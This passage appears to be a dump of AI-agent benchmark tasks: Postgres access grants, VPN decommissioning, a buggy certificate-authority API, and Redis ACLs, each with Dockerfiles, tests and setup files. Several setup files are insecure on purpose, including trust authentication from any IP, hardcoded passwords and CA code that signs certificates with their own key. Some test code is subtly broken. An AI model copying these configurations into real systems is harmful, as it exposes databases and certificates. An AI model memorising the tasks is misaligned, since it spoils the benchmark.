'dave@example.com'\nmsg3['Subject'] = 'Quarterly Report'\nmsg3['Date'] = email.utils.formatdate((datetime.now() - timedelta(days=2)).timestamp())\n\nbody = MIMEText('Please find the quarterly report attached.')\nmsg3.attach(body)\n\nattachment = MIMEBase('application', 'octet-stream')\nattachment.set_payload(b'Sample PDF content here...')\nencoders.encode_base64(attachment)\nattachment.add_header('Content-Disposition', 'attachment; filename=\""report.pdf\""')\nmsg3.attach(attachment)\nmbox.add(msg3)\n\n# Email 4: UTF-8 encoded email\nmsg4 = MIMEText('Email with unicode: caf\u00e9, r\u00e9sum\u00e9, \u65e5\u672c\u8a9e', 'plain', 'utf-8')\nmsg4['From'] = 'international@example.com'\nmsg4['To'] = 'global@example.com'\nmsg4['Subject'] = 'Unicode Test: caf\u00e9'\nmsg4['Date'] = email.utils.formatdate((datetime.now() - timedelta(days=3)).timestamp())\nmbox.add(msg4)\n\n# Email 5: Email with no subject\nmsg5 = MIMEText('This email has no subject line.')\nmsg5['From'] = 'forgetful@example.com'\nmsg5['To'] = 'reminder@example.com'\nmsg5['Date'] = email.utils.formatdate((datetime.now() - timedelta(days=4)).timestamp())\nmbox.add(msg5)\n\nmbox.close()\n\n# Create a second MBOX file\nmbox2 = mailbox.mbox('/app/mail_archives/sent.mbox')\n\n# Email 6: Long subject line\nmsg6 = MIMEText('Email with a very long subject.')\nmsg6['From'] = 'verbose@example.com'\nmsg6['To'] = 'patient@example.com'\nmsg6['Subject'] = 'This is a very long subject line that should be truncated when creating the filename to avoid filesystem limitations'\nmsg6['Date'] = email.utils.formatdate((datetime.now() - timedelta(days=5)).timestamp())\nmbox2.add(msg6)\n\n# Email 7: HTML email\nmsg7 = MIMEMultipart('alternative')\nmsg7['From'] = 'html@example.com'\nmsg7['To'] = 'web@example.com'\nmsg7['Subject'] = 'HTML Newsletter'\nmsg7['Date'] = email.utils.formatdate((datetime.now() - timedelta(days=6)).timestamp())\n\ntext_part = MIMEText('This is the plain text version.', 'plain')\nhtml_part = MIMEText('<html><body><h1>Newsletter</h1><p>This is HTML content.</p></body></html>', 'html')\nmsg7.attach(text_part)\nmsg7.attach(html_part)\nmbox2.add(msg7)\n\nmbox2.close()\n\nprint(\""MBOX files created successfully!\"")""}",2025-07-21T19:03:58.154551,2025-07-21T19:03:58.154551
draft_dp_1e612714,hard,draft_dp_1e612714,security,We need anonymous read access to our products and blog_posts tables in Postgres. Keep the users and audit_logs tables private - only authenticated users should access those.,security,sys-admin|security,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Install PostgreSQL (default version in Ubuntu 24.04)
RUN apt-get update && \
    apt-get install -y postgresql postgresql-client && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*

# Copy configuration and initialization files
COPY pg_hba.conf /etc/postgresql/16/main/pg_hba.conf
COPY init_db.sql /tmp/init_db.sql

# Initialize PostgreSQL
RUN service postgresql start && \
    su postgres -c ""psql -f /tmp/init_db.sql"" && \
    service postgresql stop

# Configure PostgreSQL to listen on all interfaces
RUN echo ""listen_addresses = '*'"" >> /etc/postgresql/16/main/postgresql.conf

# Set working directory
WORKDIR /workspace

# Start PostgreSQL service on container start
RUN echo '#!/bin/bash\nservice postgresql start\nexec bash' > /start.sh && \
    chmod +x /start.sh

CMD [""/start.sh""]","import subprocess
import time

def test_anonymous_can_read_public_tables():
    """"""Test that anonymous users can read from public tables (products and blog_posts).""""""
    # Wait for PostgreSQL to be ready
    time.sleep(2)
    
    # First check if anonymous role exists and can connect
    check_anon = subprocess.run(
        ['psql', '-h', 'localhost', '-U', 'anonymous', '-d', 'company_db', '-c', 
         'SELECT current_user;'],
        capture_output=True,
        text=True
    )
    
    # If anonymous user doesn't exist, skip detailed testing and just check that setup wasn't done
    if check_anon.returncode != 0:
        # Agent hasn't set up anonymous access yet - that's what we're testing
        assert False, ""Anonymous role not configured - agent hasn't completed the task""
    
    # Test reading from products table as anonymous user
    result = subprocess.run(
        ['psql', '-h', 'localhost', '-U', 'anonymous', '-d', 'company_db', '-c', 
         'SELECT COUNT(*) FROM products;'],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0, f""Failed to read products table: {result.stderr}""
    assert '4' in result.stdout, ""Should be able to count products""
    
    # Test reading from blog_posts table as anonymous user
    result = subprocess.run(
        ['psql', '-h', 'localhost', '-U', 'anonymous', '-d', 'company_db', '-c', 
         'SELECT COUNT(*) FROM blog_posts;'],
        capture_output=True,
        text=True
    )
    
    assert result.returncode == 0, f""Failed to read blog_posts table: {result.stderr}""
    assert '3' in result.stdout, ""Should be able to count blog posts""

def test_anonymous_cannot_read_private_tables():
    """"""Test that anonymous users cannot read from private tables (users and audit_logs).""""""
    # Wait for PostgreSQL to be ready
    time.sleep(2)
    
    # First check if anonymous role exists
    check_anon = subprocess.run(
        ['psql', '-h', 'localhost', '-U', 'anonymous', '-d', 'company_db', '-c', 
         'SELECT current_user;'],
        capture_output=True,
        text=True
    )
    
    if check_anon.returncode != 0:
        # Agent hasn't set up anonymous access yet
        assert False, ""Anonymous role not configured - agent hasn't completed the task""
    
    # Test reading from users table as anonymous user - should fail
    result = subprocess.run(
        ['psql', '-h', 'localhost', '-U', 'anonymous', '-d', 'company_db', '-c', 
         'SELECT COUNT(*) FROM users;'],
        capture_output=True,
        text=True
    )
    
    # Should get permission denied
    assert result.returncode != 0 or 'permission denied' in result.stderr.lower() or 'permission denied' in result.stdout.lower(), \
        f""Anonymous user should not be able to read users table. stdout: {result.stdout}, stderr: {result.stderr}""
    
    # Test reading from audit_logs table as anonymous user - should fail
    result = subprocess.run(
        ['psql', '-h', 'localhost', '-U', 'anonymous', '-d', 'company_db', '-c', 
         'SELECT COUNT(*) FROM audit_logs;'],
        capture_output=True,
        text=True
    )
    
    # Should get permission denied
    assert result.returncode != 0 or 'permission denied' in result.stderr.lower() or 'permission denied' in result.stdout.lower(), \
        f""Anonymous user should not be able to read audit_logs table. stdout: {result.stdout}, stderr: {result.stderr}""

def test_public_read_permissions_configured():
    """"""Test that the permission system is properly configured for public read access.""""""
    # Wait for PostgreSQL to be ready
    time.sleep(2)
    
    # Check if proper grants exist on public tables using postgres superuser
    result = subprocess.run(
        ['psql', '-h', 'localhost', '-U', 'postgres', '-d', 'company_db', '-c', 
         ""SELECT has_table_privilege('anonymous', 'products', 'SELECT') as products_read, ""
         ""has_table_privilege('anonymous', 'blog_posts', 'SELECT') as blog_posts_read;""],
        capture_output=True,
        text=True
    )
    
    if result.returncode != 0:
        # If anonymous role doesn't exist yet, agent hasn't completed task
        if 'does not exist' in result.stderr:
            assert False, ""Anonymous role not created - agent hasn't completed the task""
        assert False, f""Failed to check permissions: {result.stderr}""
    
    # Both should be true
    assert 't' in result.stdout.lower(), ""Anonymous user should have SELECT permission on public tables""","{""test_anonymous_can_read_public_tables"": 0.4, ""test_anonymous_cannot_read_private_tables"": 0.4, ""test_public_read_permissions_configured"": 0.2}","{""init_db.sql"": ""-- Create database and basic schema\nCREATE DATABASE company_db;\n\n\\c company_db\n\n-- Create tables with sensitive data\nCREATE TABLE users (\n    id SERIAL PRIMARY KEY,\n    username VARCHAR(100) UNIQUE NOT NULL,\n    email VARCHAR(255) UNIQUE NOT NULL,\n    password_hash VARCHAR(255) NOT NULL,\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);\n\nCREATE TABLE audit_logs (\n    id SERIAL PRIMARY KEY,\n    user_id INTEGER REFERENCES users(id),\n    action VARCHAR(255) NOT NULL,\n    ip_address INET,\n    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);\n\n-- Create tables with public data\nCREATE TABLE products (\n    id SERIAL PRIMARY KEY,\n    name VARCHAR(255) NOT NULL,\n    description TEXT,\n    price DECIMAL(10,2),\n    in_stock BOOLEAN DEFAULT true,\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP\n);\n\nCREATE TABLE blog_posts (\n    id SERIAL PRIMARY KEY,\n    title VARCHAR(255) NOT NULL,\n    content TEXT,\n    author VARCHAR(100),\n    published_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n    is_published BOOLEAN DEFAULT true\n);\n\n-- Insert sample data\nINSERT INTO users (username, email, password_hash) VALUES\n('admin', 'admin@company.com', '$2a$10$abcdefghijklmnopqrstuvwxyz'),\n('john_doe', 'john@company.com', '$2a$10$1234567890abcdefghijklmn'),\n('jane_smith', 'jane@company.com', '$2a$10$zyxwvutsrqponmlkjihgfedc');\n\nINSERT INTO audit_logs (user_id, action, ip_address) VALUES\n(1, 'LOGIN', '192.168.1.100'),\n(2, 'UPDATE_PROFILE', '192.168.1.101'),\n(1, 'DELETE_USER', '192.168.1.100');\n\nINSERT INTO products (name, description, price, in_stock) VALUES\n('Laptop Pro X1', 'High-performance laptop with 16GB RAM', 1299.99, true),\n('Wireless Mouse', 'Ergonomic wireless mouse with 3-year battery', 29.99, true),\n('USB-C Hub', '7-in-1 USB-C hub with HDMI and ethernet', 59.99, false),\n('Mechanical Keyboard', 'RGB mechanical keyboard with blue switches', 149.99, true);\n\nINSERT INTO blog_posts (title, content, author, is_published) VALUES\n('Welcome to Our New Store', 'We are excited to announce the launch of our new online store...', 'Marketing Team', true),\n('Top 10 Productivity Tips', 'Here are our favorite productivity tips for remote workers...', 'John Doe', true),\n('Black Friday Deals Coming Soon', 'Get ready for amazing discounts this Black Friday...', 'Sales Team', true);"", ""pg_hba.conf"": ""# PostgreSQL Client Authentication Configuration File\n# TYPE  DATABASE        USER            ADDRESS                 METHOD\n\n# Allow local connections\nlocal   all             all                                     trust\n\n# Allow connections from localhost\nhost    all             all             127.0.0.1/32            trust\nhost    all             all             ::1/128                 trust\n\n# Allow connections from any IP (for testing purposes)\nhost    all             all             0.0.0.0/0               trust""}",2025-07-21T18:08:35.571746,2025-07-22T15:15:26.111962+00:00
draft_dp_f24d5d8f,medium,draft_dp_f24d5d8f,system-administration,"Need to decommission the VPN server. Archive all certs and configs (encrypt with 'vpn-archive-secure'), then securely wipe everything including logs. CA password is 'vpn_ca_admin'.",system-administration,security|encryption|sys-admin,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && \
    apt-get install -y openvpn easy-rsa gnupg2 && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*

# Set up OpenVPN directories
RUN mkdir -p /etc/openvpn/easy-rsa /var/log/openvpn /backup

# Copy Easy-RSA
RUN cp -r /usr/share/easy-rsa/* /etc/openvpn/easy-rsa/

# Copy configuration files
COPY server.conf /etc/openvpn/server.conf
COPY vars /etc/openvpn/easy-rsa/vars

# Setup PKI structure
COPY setup_pki.sh /tmp/setup_pki.sh
RUN chmod +x /tmp/setup_pki.sh && \
    cd /etc/openvpn/easy-rsa && \
    /tmp/setup_pki.sh && \
    rm /tmp/setup_pki.sh

# Create log files with some history
COPY openvpn.log /var/log/openvpn/openvpn.log
RUN echo ""Common Name,Real Address,Bytes Received,Bytes Sent,Connected Since"" > /var/log/openvpn/openvpn-status.log && \
    echo ""john.doe,192.168.1.105:54321,1048576,524288,2024-07-15 09:32:46"" >> /var/log/openvpn/openvpn-status.log && \
    echo ""jane.smith,192.168.1.106:54322,2097152,1048576,2024-07-15 10:15:30"" >> /var/log/openvpn/openvpn-status.log

# Create systemd service file (even though systemd won't run, for completeness)
RUN mkdir -p /lib/systemd/system && \
    echo ""[Unit]"" > /lib/systemd/system/openvpn@.service && \
    echo ""Description=OpenVPN connection to %i"" >> /lib/systemd/system/openvpn@.service && \
    echo ""[Service]"" >> /lib/systemd/system/openvpn@.service && \
    echo ""ExecStart=/usr/sbin/openvpn --config /etc/openvpn/%i.conf"" >> /lib/systemd/system/openvpn@.service

WORKDIR /root","import os
import subprocess
import tempfile

def test_encrypted_archive_created():
    """"""Test that the encrypted VPN archive was created and can be decrypted.""""""
    # Check archive exists
    assert os.path.exists('/backup/vpn_complete_archive.tar.gz.gpg'), ""Encrypted archive not found""
    
    # Try to decrypt and verify contents
    with tempfile.TemporaryDirectory() as tmpdir:
        decrypt_cmd = f""echo 'vpn-archive-secure' | gpg --batch --yes --passphrase-fd 0 -d /backup/vpn_complete_archive.tar.gz.gpg | tar -xz -C {tmpdir}""
        result = subprocess.run(decrypt_cmd, shell=True, capture_output=True)
        assert result.returncode == 0, f""Failed to decrypt archive: {result.stderr.decode()}""
        
        # Verify key PKI components are in archive
        assert os.path.exists(f""{tmpdir}/pki/ca.crt""), ""CA certificate not in archive""
        assert os.path.exists(f""{tmpdir}/pki/issued/server.crt""), ""Server certificate not in archive""
        assert os.path.exists(f""{tmpdir}/server.conf""), ""Server config not in archive""

def test_vpn_completely_removed():
    """"""Test that all VPN components have been securely removed.""""""
    # Check that OpenVPN directories are gone
    assert not os.path.exists('/etc/openvpn'), ""/etc/openvpn directory still exists""
    assert not os.path.exists('/var/log/openvpn'), ""/var/log/openvpn directory still exists""
    
    # Check that OpenVPN package is removed
    result = subprocess.run(['dpkg', '-l', 'openvpn'], capture_output=True)
    assert result.returncode != 0 or b'ii  openvpn' not in result.stdout, ""OpenVPN package still installed""
    
    # Verify no certificate files remain in filesystem
    find_certs = subprocess.run(['find', '/', '-name', '*.crt', '-o', '-name', '*.key', '2>/dev/null'], 
                               shell=True, capture_output=True, text=True)
    cert_files = [f for f in find_certs.stdout.strip().split('\n') if f and '/proc' not in f and '/sys' not in f]
    assert len(cert_files) == 0, f""Certificate files still found: {cert_files}""","{""test_encrypted_archive_created"": 0.6, ""test_vpn_completely_removed"": 0.4}","{""vars"": ""set_var EASYRSA_REQ_COUNTRY    \""US\""\nset_var EASYRSA_REQ_PROVINCE   \""California\""\nset_var EASYRSA_REQ_CITY       \""San Francisco\""\nset_var EASYRSA_REQ_ORG        \""Example Corp\""\nset_var EASYRSA_REQ_EMAIL      \""admin@example.com\""\nset_var EASYRSA_REQ_OU         \""IT Department\""\n\nset_var EASYRSA_KEY_SIZE       2048\nset_var EASYRSA_ALGO           rsa\nset_var EASYRSA_CA_EXPIRE      3650\nset_var EASYRSA_CERT_EXPIRE    3650\nset_var EASYRSA_CRL_DAYS       180"", ""server.conf"": ""port 1194\nproto udp\ndev tun\nca /etc/openvpn/easy-rsa/pki/ca.crt\ncert /etc/openvpn/easy-rsa/pki/issued/server.crt\nkey /etc/openvpn/easy-rsa/pki/private/server.key\ndh /etc/openvpn/easy-rsa/pki/dh.pem\ncrl-verify /etc/openvpn/easy-rsa/pki/crl.pem\n\nserver 10.8.0.0 255.255.255.0\nifconfig-pool-persist /var/log/openvpn/ipp.txt\n\npush \""redirect-gateway def1 bypass-dhcp\""\npush \""dhcp-option DNS 8.8.8.8\""\npush \""dhcp-option DNS 8.8.4.4\""\n\nkeepalive 10 120\ncipher AES-256-CBC\nauth SHA256\n\nuser nobody\ngroup nogroup\npersist-key\npersist-tun\n\nstatus /var/log/openvpn/openvpn-status.log\nlog-append /var/log/openvpn/openvpn.log\nverb 3"", ""setup_pki.sh"": ""#!/bin/bash\n# This script sets up a basic PKI structure for testing\n\nset -e\n\ncd /etc/openvpn/easy-rsa\n\n# Initialize PKI\n./easyrsa --batch init-pki\n\n# Build CA (with password)\necho -e \""vpn_ca_admin\\nvpn_ca_admin\"" | ./easyrsa --batch build-ca nopass\n\n# Generate DH params\n./easyrsa --batch gen-dh\n\n# Generate server certificate\n./easyrsa --batch build-server-full server nopass\n\n# Generate client certificates\n./easyrsa --batch build-client-full john.doe nopass\n./easyrsa --batch build-client-full jane.smith nopass\n./easyrsa --batch build-client-full bob.wilson nopass\n./easyrsa --batch build-client-full alice.johnson nopass\n\n# Revoke one certificate to have some already revoked\necho \""vpn_ca_admin\"" | ./easyrsa --batch revoke alice.johnson\n\n# Generate initial CRL\necho \""vpn_ca_admin\"" | ./easyrsa --batch gen-crl\n\n# Copy CRL to OpenVPN directory\ncp pki/crl.pem /etc/openvpn/\n\necho \""PKI setup complete\"""", ""openvpn.log"": ""Mon Jul 15 08:15:23 2024 OpenVPN 2.5.9 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] built on Jul 15 2024\nMon Jul 15 08:15:23 2024 library versions: OpenSSL 3.0.2 15 Mar 2022, LZO 2.10\nMon Jul 15 08:15:23 2024 Diffie-Hellman initialized with 2048 bit key\nMon Jul 15 08:15:23 2024 CRL: loaded 1 CRLs from file /etc/openvpn/easy-rsa/pki/crl.pem\nMon Jul 15 08:15:23 2024 ROUTE_GATEWAY 172.17.0.1/255.255.0.0 IFACE=eth0 HWADDR=02:42:ac:11:00:02\nMon Jul 15 08:15:23 2024 TUN/TAP device tun0 opened\nMon Jul 15 08:15:23 2024 TUN/TAP TX queue length set to 100\nMon Jul 15 08:15:23 2024 /sbin/ip link set dev tun0 up mtu 1500\nMon Jul 15 08:15:23 2024 /sbin/ip addr add dev tun0 local 10.8.0.1 peer 10.8.0.2\nMon Jul 15 08:15:23 2024 /sbin/ip route add 10.8.0.0/24 via 10.8.0.2\nMon Jul 15 08:15:23 2024 Could not determine IPv4/IPv6 protocol. Using AF_INET\nMon Jul 15 08:15:23 2024 Socket Buffers: R=[212992->212992] S=[212992->212992]\nMon Jul 15 08:15:23 2024 UDPv4 link local (bound): [AF_INET][undef]:1194\nMon Jul 15 08:15:23 2024 UDPv4 link remote: [AF_UNSPEC]\nMon Jul 15 08:15:23 2024 MULTI: multi_init called, r=256 v=256\nMon Jul 15 08:15:23 2024 IFCONFIG POOL: base=10.8.0.4 size=62, ipv6=0\nMon Jul 15 08:15:23 2024 IFCONFIG POOL LIST\nMon Jul 15 08:15:23 2024 Initialization Sequence Completed\nMon Jul 15 09:32:45 2024 192.168.1.105:54321 TLS: Initial packet from [AF_INET]192.168.1.105:54321, sid=abc12345 def67890\nMon Jul 15 09:32:46 2024 192.168.1.105:54321 VERIFY OK: depth=1, CN=Easy-RSA CA\nMon Jul 15 09:32:46 2024 192.168.1.105:54321 VERIFY OK: depth=0, CN=john.doe\nMon Jul 15 09:32:46 2024 192.168.1.105:54321 peer info: IV_VER=2.5.8\nMon Jul 15 09:32:46 2024 192.168.1.105:54321 peer info: IV_PLAT=linux\nMon Jul 15 09:32:46 2024 192.168.1.105:54321 PLUGIN_CALL: POST /usr/lib/x86_64-linux-gnu/openvpn/plugins/openvpn-plugin-auth-pam.so/PLUGIN_AUTH_USER_PASS_VERIFY status=0\nMon Jul 15 09:32:46 2024 192.168.1.105:54321 TLS: Username/Password authentication succeeded for username 'john.doe'\nMon Jul 15 09:32:46 2024 192.168.1.105:54321 [john.doe] Peer Connection Initiated with [AF_INET]192.168.1.105:54321\nMon Jul 15 09:32:46 2024 john.doe/192.168.1.105:54321 MULTI_sva: pool returned IPv4=10.8.0.6, IPv6=(Not enabled)\nMon Jul 15 09:32:46 2024 john.doe/192.168.1.105:54321 MULTI: Learn: 10.8.0.6 -> john.doe/192.168.1.105:54321\nMon Jul 15 09:32:46 2024 john.doe/192.168.1.105:54321 MULTI: primary virtual IP for john.doe/192.168.1.105:54321: 10.8.0.6""}",2025-07-21T19:05:57.971037,2025-07-21T19:05:57.971037
draft_dp_01ba4b86,extremely_hard,draft_dp_01ba4b86,security,The CA certificate generation is broken. Fix it so we can issue certificates for our internal services via the API endpoint at localhost:8080/issue-cert.,security,python|api|encryption,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /ca-system

RUN apt-get update && apt-get install -y \
    openssl \
    curl \
    && rm -rf /var/lib/apt/lists/*

RUN pip install fastapi uvicorn cryptography

COPY ca_api.py /ca-system/
COPY ca_config.json /ca-system/
COPY generate_ca.sh /ca-system/
COPY certs/ /ca-system/certs/

RUN chmod +x generate_ca.sh

EXPOSE 8080

CMD [""uvicorn"", ""ca_api:app"", ""--host"", ""0.0.0.0"", ""--port"", ""8080""]","import subprocess
import json
import time
from cryptography import x509
from cryptography.hazmat.backends import default_backend

def test_certificate_issuance_via_api():
    """"""Test that certificates can be issued via the API endpoint""""""
    # Give the service time to start
    time.sleep(2)
    
    # Request a certificate
    result = subprocess.run([
        'curl', '-X', 'POST',
        'http://localhost:8080/issue-cert',
        '-H', 'Content-Type: application/json',
        '-d', '{""common_name"": ""test.internal.com"", ""organization"": ""Test Org""}'
    ], capture_output=True, text=True)
    
    assert result.returncode == 0, f""curl failed: {result.stderr}""
    
    response = json.loads(result.stdout)
    assert 'certificate' in response, ""Response missing certificate""
    assert 'private_key' in response, ""Response missing private key""
    assert 'expires' in response, ""Response missing expiration""
    
    # Verify the certificate is valid PEM format
    cert_pem = response['certificate'].encode()
    cert = x509.load_pem_x509_certificate(cert_pem, default_backend())
    
    # Check basic certificate properties
    assert cert.subject.get_attributes_for_oid(x509.NameOID.COMMON_NAME)[0].value == ""test.internal.com""

def test_certificate_signed_by_ca():
    """"""Test that issued certificates are properly signed by the CA""""""
    # Get the CA certificate
    ca_result = subprocess.run([
        'curl', 'http://localhost:8080/ca-cert'
    ], capture_output=True, text=True)
    
    assert ca_result.returncode == 0
    ca_response = json.loads(ca_result.stdout)
    ca_cert_pem = ca_response['ca_certificate'].encode()
    ca_cert = x509.load_pem_x509_certificate(ca_cert_pem, default_backend())
    
    # Issue a certificate
    cert_result = subprocess.run([
        'curl', '-X', 'POST',
        'http://localhost:8080/issue-cert',
        '-H', 'Content-Type: application/json',
        '-d', '{""common_name"": ""verify.internal.com""}'
    ], capture_output=True, text=True)
    
    assert cert_result.returncode == 0
    cert_response = json.loads(cert_result.stdout)
    issued_cert_pem = cert_response['certificate'].encode()
    issued_cert = x509.load_pem_x509_certificate(issued_cert_pem, default_backend())
    
    # Verify the issuer matches the CA subject
    assert issued_cert.issuer == ca_cert.subject, ""Certificate not signed by CA""","{""test_certificate_issuance_via_api"": 0.4, ""test_certificate_signed_by_ca"": 0.6}","{""ca_api.py"": ""import os\nimport json\nimport subprocess\nfrom fastapi import FastAPI, HTTPException\nfrom pydantic import BaseModel\nfrom datetime import datetime, timedelta\nfrom cryptography import x509\nfrom cryptography.x509.oid import NameOID\nfrom cryptography.hazmat.primitives import hashes, serialization\nfrom cryptography.hazmat.primitives.asymmetric import rsa\n\napp = FastAPI()\n\nclass CertRequest(BaseModel):\n    common_name: str\n    organization: str = \""Internal Services\""\n    days_valid: int = 365\n\n@app.get(\""/\"")\ndef read_root():\n    return {\""status\"": \""CA Service Running\""}\n\n@app.post(\""/issue-cert\"")\ndef issue_certificate(request: CertRequest):\n    try:\n        # Load CA certificate and key\n        ca_cert_path = \""/ca-system/certs/ca.crt\""\n        ca_key_path = \""/ca-system/certs/ca.key\""\n        \n        if not os.path.exists(ca_cert_path) or not os.path.exists(ca_key_path):\n            # Try to generate CA if it doesn't exist\n            result = subprocess.run([\""/ca-system/generate_ca.sh\""], capture_output=True, text=True)\n            if result.returncode != 0:\n                raise HTTPException(status_code=500, detail=\""CA generation failed\"")\n        \n        # Load CA cert and key\n        with open(ca_cert_path, \""rb\"") as f:\n            ca_cert = x509.load_pem_x509_certificate(f.read())\n        \n        with open(ca_key_path, \""rb\"") as f:\n            ca_key = serialization.load_pem_private_key(f.read(), password=None)\n        \n        # Generate private key for the new certificate\n        private_key = rsa.generate_private_key(\n            public_exponent=65537,\n            key_size=2048,\n        )\n        \n        # Create certificate\n        subject = x509.Name([\n            x509.NameAttribute(NameOID.COMMON_NAME, request.common_name),\n            x509.NameAttribute(NameOID.ORGANIZATION_NAME, request.organization),\n        ])\n        \n        # BUG: Using subject instead of ca_cert.subject for issuer\n        cert = x509.CertificateBuilder().subject_name(\n            subject\n        ).issuer_name(\n            subject  # Should be ca_cert.subject\n        ).public_key(\n            private_key.public_key()\n        ).serial_number(\n            x509.random_serial_number()\n        ).not_valid_before(\n            datetime.utcnow()\n        ).not_valid_after(\n            datetime.utcnow() + timedelta(days=request.days_valid)\n        ).add_extension(\n            x509.SubjectAlternativeName([\n                x509.DNSName(request.common_name),\n            ]),\n            critical=False,\n        ).sign(private_key, hashes.SHA256())  # BUG: Should sign with ca_key, not private_key\n        \n        # Serialize certificate and key\n        cert_pem = cert.public_bytes(serialization.Encoding.PEM).decode()\n        key_pem = private_key.private_bytes(\n            encoding=serialization.Encoding.PEM,\n            format=serialization.PrivateFormat.TraditionalOpenSSL,\n            encryption_algorithm=serialization.NoEncryption()\n        ).decode()\n        \n        return {\n            \""certificate\"": cert_pem,\n            \""private_key\"": key_pem,\n            \""expires\"": cert.not_valid_after.isoformat()\n        }\n        \n    except Exception as e:\n        raise HTTPException(status_code=500, detail=str(e))\n\n@app.get(\""/ca-cert\"")\ndef get_ca_certificate():\n    ca_cert_path = \""/ca-system/certs/ca.crt\""\n    if not os.path.exists(ca_cert_path):\n        raise HTTPException(status_code=404, detail=\""CA certificate not found\"")\n    \n    with open(ca_cert_path, \""r\"") as f:\n        return {\""ca_certificate\"": f.read()}"", ""ca_config.json"": ""{\n    \""ca_name\"": \""Internal Root CA\"",\n    \""organization\"": \""Internal Services\"",\n    \""country\"": \""US\"",\n    \""state\"": \""CA\"",\n    \""locality\"": \""San Francisco\"",\n    \""validity_days\"": 3650,\n    \""key_size\"": 4096\n}"", ""generate_ca.sh"": ""#!/bin/bash\n\n# Generate CA private key\nopenssl genrsa -out /ca-system/certs/ca.key 4096\n\n# Generate CA certificate\nopenssl req -new -x509 -days 3650 -key /ca-system/certs/ca.key -out /ca-system/certs/ca.crt \\\n    -subj \""/C=US/ST=CA/L=San Francisco/O=Internal CA/CN=Internal Root CA\""\n\necho \""CA certificate generated successfully\"""", ""certs/.gitkeep"": ""# Placeholder for certs directory""}",2025-07-21T19:06:06.076690,2025-07-21T19:06:06.076690
draft_dp_033fc81c,medium,draft_dp_033fc81c,system-administration,Redis is rejecting anonymous connections. Need to configure ACL rules to allow public read access while blocking all writes.,system-administration,security|sys-admin|caching,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

# Install Redis
RUN apt-get update && apt-get install -y \
    redis-server \
    redis-tools \
    && rm -rf /var/lib/apt/lists/*

# Create Redis directories
RUN mkdir -p /etc/redis /var/lib/redis /var/log/redis && \
    chown -R redis:redis /var/lib/redis /var/log/redis

# Copy configuration files
COPY redis.conf /etc/redis/redis.conf
COPY users.acl /etc/redis/users.acl
COPY init_data.sh /init_data.sh

# Set permissions
RUN chmod 644 /etc/redis/redis.conf /etc/redis/users.acl && \
    chmod +x /init_data.sh && \
    chown redis:redis /etc/redis/users.acl

WORKDIR /root

# Start Redis with initial data
CMD [""/init_data.sh""]","import subprocess
import time

def test_unauthenticated_read_access():
    """"""Test that unauthenticated users can read existing keys""""""
    # Test GET command
    result = subprocess.run(
        ['redis-cli', 'GET', 'user:1001'],
        capture_output=True,
        text=True
    )
    assert result.returncode == 0
    assert 'John Doe' in result.stdout
    
    # Test KEYS command
    result = subprocess.run(
        ['redis-cli', 'KEYS', '*'],
        capture_output=True,
        text=True
    )
    assert result.returncode == 0
    assert 'user:1001' in result.stdout
    assert 'product:laptop' in result.stdout

def test_unauthenticated_write_blocked():
    """"""Test that unauthenticated users cannot write data""""""
    # Test SET command
    result = subprocess.run(
        ['redis-cli', 'SET', 'test:key', 'value'],
        capture_output=True,
        text=True
    )
    assert result.returncode != 0 or 'NOPERM' in result.stdout or 'ERR' in result.stdout
    
    # Test DEL command
    result = subprocess.run(
        ['redis-cli', 'DEL', 'user:1001'],
        capture_output=True,
        text=True
    )
    assert result.returncode != 0 or 'NOPERM' in result.stdout or 'ERR' in result.stdout

def test_authenticated_full_access():
    """"""Test that authenticated admin can perform all operations""""""
    # Test write operation
    result = subprocess.run(
        ['redis-cli', '-a', 'admin_secret_password', 'SET', 'admin:test', 'works'],
        capture_output=True,
        text=True
    )
    assert result.returncode == 0
    assert 'OK' in result.stdout
    
    # Test read operation
    result = subprocess.run(
        ['redis-cli', '-a', 'admin_secret_password', 'GET', 'admin:test'],
        capture_output=True,
        text=True
    )
    assert result.returncode == 0
    assert 'works' in result.stdout","{""test_unauthenticated_read_access"": 0.4, ""test_unauthenticated_write_blocked"": 0.4, ""test_authenticated_full_access"": 0.2}","{""users.acl"": ""# Redis ACL users\nuser admin on +@all ~* &* >admin_secret_password\n\n# Default user - read-only access\nuser default on nopass +@read ~* -@all"", ""init_data.sh"": ""#!/bin/bash\n\n# Start Redis with config\nredis-server /etc/redis/redis.conf &\nsleep 2\n\n# Add some test data as admin\nredis-cli -a admin_secret_password <<EOF\nSET user:1001 \""John Doe\""\nSET user:1002 \""Jane Smith\""\nSET product:laptop \""ThinkPad X1\""\nSET product:phone \""iPhone 15\""\nSET config:app_name \""MyApp\""\nSET config:version \""2.3.1\""\nHSET session:abc123 user_id 1001 created_at \""2024-01-15\""\nSADD categories electronics books clothing\nEOF\n\necho \""Initial data loaded\""\n\n# Keep Redis running\ntail -f /dev/null"", ""redis.conf"": ""# Redis configuration\nport 6379\nbind 0.0.0.0\nprotected-mode yes\ndaemonize no\n\n# Basic settings\ntimeout 0\ntcp-keepalive 300\ntcp-backlog 511\ndatabases 16\n\n# ACL configuration started but incomplete\naclfile /etc/redis/users.acl\n\n# Persistence\nsave 900 1\nsave 300 10\nsave 60 10000\ndbfilename dump.rdb\ndir /var/lib/redis\n\n# Logging\nloglevel notice\nlogfile \""\""\n\n# Other settings\nrdbcompression yes\nrdbchecksum yes\nstop-writes-on-bgsave-error yes""}",2025-07-21T19:04:12.758343,2025-07-22T15:21:59.579640+00:00
draft_dp_70334ca7,hard,draft_dp_70334ca7,machine-learning,Set up an ML model registry that auto-deploys models to a serving endpoint when pushed. Need versioning support and the serving endpoint should update within 10 seconds of a new model push.,machine-learning,python|api|web-server,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

WORKDIR /app

# Install Python and dependencies
